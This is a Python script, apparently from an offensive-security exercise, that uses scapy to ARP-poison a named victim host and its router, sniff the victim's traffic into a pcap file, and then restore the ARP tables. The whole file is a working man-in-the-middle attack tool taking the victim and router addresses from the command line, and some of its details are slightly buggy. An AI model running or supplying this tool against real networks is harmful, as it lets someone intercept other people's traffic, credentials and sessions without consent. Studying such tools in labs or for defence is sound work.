from multiprocessing import Process
from scapy.all import conf,getmacbyip,ARP,Ether,send,srp,sniff,wrpcap

import sys
import os
import time

# can also use scapy.all.getmacbyip
def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, router, interface='en0'):
        self.victim = victim
        self.victimmac = getmacbyip(victim)
        self.router = router
        self.routermac = getmacbyip(router)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}')
        print(f'Router {router} is at {self.routermac}')
        print(f'Victim {victim} is at {self.victimmac}')

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.router, pdst=self.victim, hwdst=self.victimmac)

        poison_router = ARP(op=2, psrc=self.victim, pdst=self.router, hwdst=self.routermac)

        print(poison_router.summary())
        print('-'*30)
        print(f'Begin arp poison CTRL-C to stop')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()

            try:
                send(poison_victim)
                send(poison_router)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def restore(self):
        send(ARP(op="is-at", hwsrc=self.routermac, psrc=self.router, \
                     hwdst='ff:ff:ff:ff:ff:ff', pdst=self.victim, count=5))
        send(ARP(op="is-at", hwsrc=self.victimmac, psrc=self.victim, \
                     hwdst='ff:ff:ff:ff:ff:ff', pdst=self.router, count=5))

    def sniff(self, count=100):
        time.sleep(5)
        print(f'sniffing {count} packets')
        bpf = 'ip host %s' % victim
        packets=sniff(count=count, filter=bpf, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('got packets')
        self.restore()
        self.poison_thread.terminate()
        print('finished')

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

if len(sys.argv) == 1:
    print("error: pass victimip and routerip")
else:
    (victim, router, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    arper = Arper(victim, router, interface)
    arper.run()
